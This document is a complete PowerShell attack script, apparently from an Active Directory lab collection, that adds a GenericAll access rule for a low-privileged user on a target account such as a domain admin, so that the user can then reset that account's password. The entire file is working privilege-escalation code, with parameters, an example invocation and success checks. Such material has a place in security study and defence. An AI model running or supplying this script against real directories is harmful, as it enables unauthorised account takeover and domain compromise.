<#
.SYNOPSIS
Abuses weak ACL permissions to grant a low-privileged user GenericAll rights over a target AD account.

.DESCRIPTION
This script demonstrates ACL/DACL abuse in Active Directory by adding a GenericAll 
permission for a low-privileged user on a high-value target user (e.g., domain admin).
Once granted, the low-privileged account can reset the target user's password or 
perform other malicious actions.

.REQUIREMENTS
- Permissions to read and write ACLs on the target object (or write access to that object).
- Domain-joined machine.
- ActiveDirectory module (RSAT tools installed).

.PARAMETER TargetUser
The SamAccountName of the target user (e.g., "domainadmin").

.PARAMETER LowPrivUser
The SamAccountName of the low-privileged user to which GenericAll rights will be granted.

.EXAMPLE
PS> .\weak_perms_on_user.ps1 -TargetUser "domainadmin" -LowPrivUser "low.priv"
Grants "low.priv" GenericAll permissions over "domainadmin".

.NOTES
Also known as: ACL Abuse / DACL Attack
Author: Phoenix (example)
#>

param(
	[Parameter(Mandatory=$true)]
	[string]$TargetUser,

	[Parameter(Mandatory=$true)]
	[string]$LowPrivUser
)

if (-not (Get-Module -ListAvailable -Name ActiveDirectory))
{
	Write-Error "ActiveDirectory module not found. Please install RSAT tools."
	exit 1
}
Import-Module ActiveDirectory

# Get target and low-priv user AD objects
$Target = Get-ADUser -Identity $TargetUser
$LowPriv = Get-ADUser -Identity $LowPrivUser

# Load the target object as a DirectoryEntry
$TargetDN = "LDAP://" + $Target.DistinguishedName
$TargetDE = [ADSI]$TargetDN

# Translate the LowPriv user to a NTAccount SID
$LowPrivSID = (New-Object System.Security.Principal.NTAccount($LowPriv.SamAccountName)).Translate([System.Security.Principal.SecurityIdentifier])

# Get the existing ACL
$ACL = $TargetDE.ObjectSecurity

# Create new access rule with GenericAll
$Rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
	$LowPrivSID,
	[System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
	[System.Security.AccessControl.AccessControlType]::Allow
)

# Add and apply the rule
$ACL.AddAccessRule($Rule)
$TargetDE.ObjectSecurity = $ACL
$TargetDE.CommitChanges()

# Confirm that GenericAll was applied
$appliedRule = $ACL.Access | Where-Object {
	$_.IdentityReference -eq $LowPriv.SamAccountName -or $_.IdentityReference -eq "LAB\$($LowPriv.SamAccountName)" -and $_.ActiveDirectoryRights -match "GenericAll"
}

if ($appliedRule)
{
	Write-Host "[+] Successfully granted GenericAll rights to $($LowPriv.SamAccountName) over $($Target.SamAccountName)" -ForegroundColor Green
	exit 0   # success code
} else
{
	Write-Host "[-] Failed to apply GenericAll rights to $($LowPriv.SamAccountName)" -ForegroundColor Red
	exit 1   # failure code
}
